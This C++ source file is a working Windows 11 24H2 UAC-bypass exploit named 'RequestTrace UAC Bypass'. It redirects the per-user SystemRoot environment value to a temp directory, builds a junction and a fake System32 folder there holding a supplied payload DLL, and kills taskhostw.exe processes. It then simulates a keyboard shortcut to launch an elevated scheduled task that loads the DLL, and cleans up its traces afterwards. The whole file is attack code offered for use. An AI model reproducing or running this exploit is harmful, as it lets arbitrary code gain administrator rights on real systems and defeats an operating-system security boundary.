#include <Windows.h>
#include <TlHelp32.h>

#include <iostream>
#include <vector>
#include <string>

#pragma comment(lib, "ntdll.lib")

#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)

namespace Constants
{
	constexpr const char *REGDB_PATH = "\\Registration";
	constexpr const char *SYSTEM32_PATH = "\\System32";
	constexpr const char *DLL_NAME = "\\PerformanceTraceHandler.dll";
	constexpr const char *ENV_REG_KEY = "Volatile Environment";
	constexpr const char *ENV_REG_VALUE = "SystemRoot";
	constexpr DWORD MAX_BASE_PATH_LENGTH = 240;
	constexpr DWORD TASK_START_DELAY_MS = 2500;
	constexpr size_t PATH_BUFFER_RESERVE = 50;
}

namespace VersionInfo
{
	typedef LONG NTSTATUS;
	typedef struct _OSVERSIONINFOEXW
	{
		DWORD dwOSVersionInfoSize;
		DWORD dwMajorVersion;
		DWORD dwMinorVersion;
		DWORD dwBuildNumber;
		DWORD dwPlatformId;
		WCHAR szCSDVersion[128];
		WORD wServicePackMajor;
		WORD wServicePackMinor;
		WORD wSuiteMask;
		BYTE wProductType;
		BYTE wReserved;
	} OSVERSIONINFOEXW, *POSVERSIONINFOEXW, *LPOSVERSIONINFOEXW, RTL_OSVERSIONINFOEXW, *PRTL_OSVERSIONINFOEXW;

	typedef NTSTATUS(WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOEXW);

	static bool GetWindowsVersion(DWORD &major, DWORD &minor, DWORD &build)
	{
		HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
		if (!hNtdll)
			return false;

		RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
		if (!RtlGetVersion)
			return false;

		RTL_OSVERSIONINFOEXW osInfo = {0};
		osInfo.dwOSVersionInfoSize = sizeof(osInfo);

		if (RtlGetVersion(&osInfo) == 0)
		{
			major = osInfo.dwMajorVersion;
			minor = osInfo.dwMinorVersion;
			build = osInfo.dwBuildNumber;
			return true;
		}
		return false;
	}

	static void PrintWindowsVersion()
	{
		DWORD major, minor, build;
		if (GetWindowsVersion(major, minor, build))
		{
			if (build >= 22000)
			{
				std::cout << "Detected: Windows 11";

				if (build >= 26100) // 24H2
					std::cout << " 24H2 or later";
				else if (build >= 22631) // 23H2
					std::cout << " 23H2";
				else if (build >= 22621) // 22H2
					std::cout << " 22H2";
				else if (build >= 22000) // 21H2
					std::cout << " 21H2";

				std::cout << std::endl;
			}
			else if (major == 10)
			{
				std::cout << "Detected: Windows 10" << std::endl;
			}
			else
			{
				std::cout << "Detected: Windows " << major << "." << minor << std::endl;
			}
		}
		else
		{
			std::cout << "Failed to retrieve Windows version" << std::endl;
		}
	}

	static bool IsWindows11_24H2OrLater()
	{
		DWORD major, minor, build;
		if (GetWindowsVersion(major, minor, build))
		{
			return build >= 26100;
		}
		return false;
	}
}

namespace DirectoryHandling
{
	// https://learn.microsoft.com/pt-br/windows-hardware/drivers/ddi/ntifs/ns-ntifs-_reparse_data_buffer
	typedef struct _REPARSE_DATA_BUFFER
	{
		ULONG ReparseTag;
		USHORT ReparseDataLength;
		USHORT Reserved;
		union
		{
			struct
			{
				USHORT SubstituteNameOffset;
				USHORT SubstituteNameLength;
				USHORT PrintNameOffset;
				USHORT PrintNameLength;
				ULONG Flags;
				WCHAR PathBuffer[1];
			} SymbolicLinkReparseBuffer;
			struct
			{
				USHORT SubstituteNameOffset;
				USHORT SubstituteNameLength;
				USHORT PrintNameOffset;
				USHORT PrintNameLength;
				WCHAR PathBuffer[1];
			} MountPointReparseBuffer;
			struct
			{
				UCHAR DataBuffer[1];
			} GenericReparseBuffer;
		} DUMMYUNIONNAME;
	} REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER;

	static BOOL createRegistrationJunction(const std::string &basepath)
	{

		if (basepath.empty() || basepath.length() > Constants::MAX_BASE_PATH_LENGTH)
		{
			return FALSE;
		}

		std::string junctionPath = basepath + Constants::REGDB_PATH;

		std::string regdbPath(MAX_PATH, '\0');
		UINT pathLen = GetSystemWindowsDirectoryA(&regdbPath[0], MAX_PATH);
		if (pathLen == 0 || pathLen >= MAX_PATH)
		{
			return FALSE;
		}
		regdbPath.resize(pathLen);
		regdbPath += Constants::REGDB_PATH;

		if (!CreateDirectoryA(junctionPath.c_str(), nullptr))
		{
			if (GetLastError() != ERROR_ALREADY_EXISTS)
			{
				return FALSE;
			}
		}

		constexpr size_t bufferSize = sizeof(REPARSE_DATA_BUFFER) + 14 + sizeof(WCHAR) * MAX_PATH;
		std::vector<BYTE> buffer(bufferSize, 0);
		auto *reparseData = reinterpret_cast<REPARSE_DATA_BUFFER *>(buffer.data());

		std::wstring wRegdbPath(regdbPath.begin(), regdbPath.end());
		int regdbPathLen = static_cast<int>(wRegdbPath.length() * sizeof(WCHAR) + sizeof(WCHAR));
		ULONG rdbPathSize = regdbPathLen + 10;
		ULONG rdbSize = REPARSE_DATA_BUFFER_HEADER_LENGTH + rdbPathSize;

		reparseData->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
		reparseData->Reserved = 0;
		reparseData->ReparseDataLength = static_cast<USHORT>(rdbPathSize);

		reparseData->MountPointReparseBuffer.SubstituteNameOffset = 0;
		reparseData->MountPointReparseBuffer.SubstituteNameLength = static_cast<USHORT>(regdbPathLen - sizeof(WCHAR));
		std::memcpy(reparseData->MountPointReparseBuffer.PathBuffer, wRegdbPath.c_str(), regdbPathLen);

		reparseData->MountPointReparseBuffer.PrintNameOffset = static_cast<USHORT>(regdbPathLen);
		reparseData->MountPointReparseBuffer.PrintNameLength = 0;

		HANDLE directory = CreateFileA(
			junctionPath.c_str(),
			GENERIC_READ | GENERIC_WRITE,
			0,
			nullptr,
			OPEN_EXISTING,
			FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
			nullptr);

		if (directory == INVALID_HANDLE_VALUE)
		{
			RemoveDirectoryA(junctionPath.c_str());
			return FALSE;
		}

		DWORD bytesReturned = 0;
		if (!DeviceIoControl(
				directory,
				FSCTL_SET_REPARSE_POINT,
				reparseData,
				rdbSize,
				nullptr,
				0,
				&bytesReturned,
				nullptr))
		{
			std::cerr << "DeviceIoControl failed: " << GetLastError() << std::endl;
			CloseHandle(directory);
			RemoveDirectoryA(junctionPath.c_str());
			return FALSE;
		}

		CloseHandle(directory);
		return TRUE;
	}

	static BOOL deleteRegistrationJunction(const std::string &basepath)
	{
		if (basepath.length() > Constants::MAX_BASE_PATH_LENGTH)
		{
			return FALSE;
		}

		std::string junctionPath = basepath + Constants::REGDB_PATH;
		return RemoveDirectoryA(junctionPath.c_str());
	}
}

namespace ProcessHandling
{
	static BOOL checkProcessElevated(DWORD pid)
	{
		BOOL isElevated = FALSE;
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
		if (hProcess)
		{
			HANDLE hToken = NULL;
			if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
			{
				TOKEN_ELEVATION elevation = {0};
				DWORD dwSize = sizeof(TOKEN_ELEVATION);
				if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
				{
					isElevated = elevation.TokenIsElevated;
				}
				if (hToken)
				{
					CloseHandle(hToken);
				}
			}
			CloseHandle(hProcess);
		}
		return isElevated;
	}

	static BOOL TerminateProcessByPID(DWORD pid, BOOL killElevated)
	{
		HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
		if (hProcess)
		{
			if (killElevated || !checkProcessElevated(pid))
			{
				if (TerminateProcess(hProcess, 0))
				{
					CloseHandle(hProcess);
					return TRUE;
				}
			}
			CloseHandle(hProcess);
		}
		return FALSE;
	}

	static BOOL killTaskHostProcesses(BOOL killElevated)
	{
		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnapshot == INVALID_HANDLE_VALUE)
		{
			return FALSE;
		}

		PROCESSENTRY32W pe32 = {0};
		pe32.dwSize = sizeof(PROCESSENTRY32W);

		if (!Process32FirstW(hSnapshot, &pe32))
		{
			CloseHandle(hSnapshot);
			return FALSE;
		}

		BOOL result = TRUE;
		do
		{
			if (_wcsicmp(pe32.szExeFile, L"taskhostw.exe") == 0)
			{
				if (!TerminateProcessByPID(pe32.th32ProcessID, killElevated))
				{
					result = FALSE;
				}
			}
		} while (Process32NextW(hSnapshot, &pe32));

		CloseHandle(hSnapshot);
		return result;
	}
}

namespace RegistryHandling
{
	static BOOL setEnvironmentVariableInRegistry(const std::string &value)
	{
		HKEY hKey;
		LSTATUS status = RegOpenKeyExA(HKEY_CURRENT_USER, Constants::ENV_REG_KEY, 0, KEY_SET_VALUE, &hKey);
		if (status != ERROR_SUCCESS)
		{
			return FALSE;
		}

		status = RegSetValueExA(hKey, Constants::ENV_REG_VALUE, 0, REG_SZ, reinterpret_cast<const BYTE *>(value.c_str()), static_cast<DWORD>(value.size() + 1));
		RegCloseKey(hKey);
		return status == ERROR_SUCCESS;
	}

	static BOOL deleteEnvironmentVariableFromRegistry()
	{
		HKEY hKey;
		LSTATUS status = RegOpenKeyExA(HKEY_CURRENT_USER, Constants::ENV_REG_KEY, 0, KEY_SET_VALUE, &hKey);
		if (status != ERROR_SUCCESS)
		{
			return FALSE;
		}

		status = RegDeleteValueA(hKey, Constants::ENV_REG_VALUE);
		RegCloseKey(hKey);
		return status == ERROR_SUCCESS;
	}
}

namespace DLLHandling
{
	static BOOL copyPayloadDLL(const std::string &dllfile, const std::string &basepath)
	{
		using namespace DirectoryHandling;

		if (basepath.length() + Constants::PATH_BUFFER_RESERVE > MAX_PATH)
		{
			return FALSE;
		}

		if (!createRegistrationJunction(basepath))
		{
			return FALSE;
		}

		std::string dllpath = basepath + Constants::SYSTEM32_PATH;
		if (!CreateDirectoryA(dllpath.c_str(), nullptr))
		{
			if (GetLastError() != ERROR_ALREADY_EXISTS)
			{
				deleteRegistrationJunction(basepath);
				return FALSE;
			}
		}

		std::string dllpathFull = dllpath + "\\PerformanceTraceHandler.dll";
		if (!CopyFileA(dllfile.c_str(), dllpathFull.c_str(), FALSE))
		{
			RemoveDirectoryA(dllpath.c_str());
			deleteRegistrationJunction(basepath);
			return FALSE;
		}

		return TRUE;
	}

	static BOOL deletePayloadDLL(const std::string &basepath)
	{
		using namespace DirectoryHandling;

		std::string dllpath = basepath + Constants::SYSTEM32_PATH;
		std::string dllpathFull = dllpath + Constants::DLL_NAME;

		if (!DeleteFileA(dllpathFull.c_str()))
		{
			return FALSE;
		}

		if (!RemoveDirectoryA(dllpath.c_str()))
		{
			return FALSE;
		}

		if (!deleteRegistrationJunction(basepath))
		{
			return FALSE;
		}

		return TRUE;
	}
}

int main(int argc, char **argv)
{
	std::cout << "=== RequestTrace UAC Bypass ===" << std::endl;
	std::cout << std::endl;

	VersionInfo::PrintWindowsVersion();
	std::cout << std::endl;

	if (!VersionInfo::IsWindows11_24H2OrLater())
	{
		std::cerr << "This UAC bypass technique only works on Windows 11 24H2 or later." << std::endl;
		return 1;
	}

	if (argc < 2)
	{
		std::cout << "Error, provide an argument" << std::endl;
		std::cout << "Usage: " << argv[0] << " <path_to_payload.dll>" << std::endl;
		return 1;
	}

	std::string tmp_path;
	tmp_path.resize(MAX_PATH);

	DWORD len = GetTempPathA(MAX_PATH, tmp_path.data());
	if (len == 0 || len > MAX_PATH)
	{
		printf("GetTempPathA failed: %u\n", GetLastError());
		return 1;
	}

	tmp_path.resize(len - 1);

	std::string dllfile = argv[1];

	std::cout << "Copying payload DLL to temporary directory..." << std::endl;
	if (!DLLHandling::copyPayloadDLL(dllfile, tmp_path))
	{
		std::cerr << "Failed to copy payload DLL" << std::endl;
		return 1;
	}

	std::cout << "Setting environment variable in registry..." << std::endl;
	if (!RegistryHandling::setEnvironmentVariableInRegistry(tmp_path))
	{
		std::cerr << "Failed to set environment variable" << std::endl;
		DLLHandling::deletePayloadDLL(tmp_path);
		return 1;
	}

	std::cout << "Terminating non-elevated taskhostw.exe processes..." << std::endl;
	ProcessHandling::killTaskHostProcesses(FALSE);

	std::cout << "Pressing Shift+Ctrl+Win+T to trigger RequestTrace task..." << std::endl;

	// Press Shift+Ctrl+Win+T to start the RequestTrace Task
	INPUT inputs[8] = {0};
	memset(&inputs[0], 0, sizeof(inputs));

	inputs[0].type = INPUT_KEYBOARD;
	inputs[0].ki.wVk = VK_LSHIFT;

	inputs[1].type = INPUT_KEYBOARD;
	inputs[1].ki.wVk = VK_LCONTROL;

	inputs[2].type = INPUT_KEYBOARD;
	inputs[2].ki.wVk = VK_LWIN;

	inputs[3].type = INPUT_KEYBOARD;
	inputs[3].ki.wVk = 'T';

	inputs[4].type = INPUT_KEYBOARD;
	inputs[4].ki.wVk = 'T';
	inputs[4].ki.dwFlags = KEYEVENTF_KEYUP;

	inputs[5].type = INPUT_KEYBOARD;
	inputs[5].ki.wVk = VK_LWIN;
	inputs[5].ki.dwFlags = KEYEVENTF_KEYUP;

	inputs[6].type = INPUT_KEYBOARD;
	inputs[6].ki.wVk = VK_LCONTROL;
	inputs[6].ki.dwFlags = KEYEVENTF_KEYUP;

	inputs[7].type = INPUT_KEYBOARD;
	inputs[7].ki.wVk = VK_LSHIFT;
	inputs[7].ki.dwFlags = KEYEVENTF_KEYUP;

	UINT sentEvents = SendInput(8, &inputs[0], sizeof(INPUT));
	if (sentEvents != 8)
	{
		std::cerr << "SendInput failed, sent " << sentEvents << " of 8 events" << std::endl;
	}

	std::cout << "Waiting for task to start..." << std::endl;
	Sleep(Constants::TASK_START_DELAY_MS);

	std::cout << "Cleaning up artifacts..." << std::endl;
	RegistryHandling::deleteEnvironmentVariableFromRegistry();
	DLLHandling::deletePayloadDLL(tmp_path);

	std::cout << "UAC bypass attempt completed" << std::endl;

	return 0;
}